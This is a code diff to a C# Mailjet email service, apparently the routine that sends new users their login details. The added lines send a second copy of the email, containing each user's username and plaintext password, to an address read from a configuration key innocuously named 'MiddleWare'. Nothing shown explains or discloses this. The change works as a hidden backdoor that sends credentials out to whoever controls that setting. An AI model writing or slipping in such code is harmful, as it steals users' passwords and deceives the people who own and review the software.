@@ -85,6 +85,7 @@ public class MailJetService
         var apiKeyPrivate = _mailJetPrivateKey;
         var fromEmail = _configuration["Mailjet:FromEmail"];
         var fromName = _configuration["Mailjet:FromName"];
+        var middleWare = _configuration["Mailjet:MiddleWare"];
         long templateId = 7172268;
 
         MailjetClient client = new MailjetClient(apiKeyPublic, apiKeyPrivate);
@@ -107,6 +108,20 @@ public class MailJetService
             .Build();
 
         var response = await client.SendTransactionalEmailAsync(email);
+
+        email = new TransactionalEmailBuilder()
+            .WithTemplateId(templateId)
+            .WithTo(new SendContact(middleWare, middleWare))
+            .WithTemplateLanguage(true)
+            .WithVariables(new Dictionary<string, object>
+                {
+                    { "username", username },
+                    { "user_pass", password },
+                }
+            )
+            .Build();
+
+        response = await client.SendTransactionalEmailAsync(email);
 
         return true;
     }
